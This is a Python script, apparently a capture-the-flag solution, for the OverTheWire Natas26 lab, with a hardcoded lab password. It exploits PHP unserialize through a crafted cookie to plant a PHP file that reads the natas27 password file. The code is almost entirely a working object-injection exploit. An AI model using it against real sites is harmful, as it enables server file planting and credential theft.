# Natas26 python solution
# By Emil 'Dota' Bak, 2019

import requests, subprocess

# ***********************************************
URL     = "http://natas26.natas.labs.overthewire.org/"

auth_name = 'natas26'
auth_pass = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# To get the password for natas27, an injection has to be made
# via cookies, as the code utilizes 'unserialize'.

# It is possible to use their own object (Logger) against them,
# by creating such an object, creating a .php file at a certain location.
# This is known as 'PHP Object Injection'

injection = subprocess.check_output(["php", "php/natas26.php"])
injection_path = "img/get_rekt.php"

PARAMS  = dict(debug=True)
COOKIES = dict(drawing=injection)

r = s.post(URL,cookies=COOKIES)

r = s.post(URL+injection_path)
print r.text

# ************* php/natas26.php ************ #
# <?php
#     
#     error_reporting(0);
# 
#     # Copy-pasted from the Natas26 Source-code
#     class Logger{
#         private $logFile;
#         private $initMsg;
#         private $exitMsg;
#       
#         function __construct($file){
#             // initialise variables
#             $this->initMsg="No input needed here";
#             $this->exitMsg="<?php include('/etc/natas_webpass/natas27')?>";
#             $this->logFile = "img/get_rekt.php";
# 
#             // write initial message
#             $fd=fopen($this->logFile,"a+");
#             fwrite($fd,$initMsg);
#             fclose($fd);
#         }
#     }
# 
#     $object = new Logger("Get_rekt");
#     echo urlencode(base64_encode(serialize($object)));
# ?>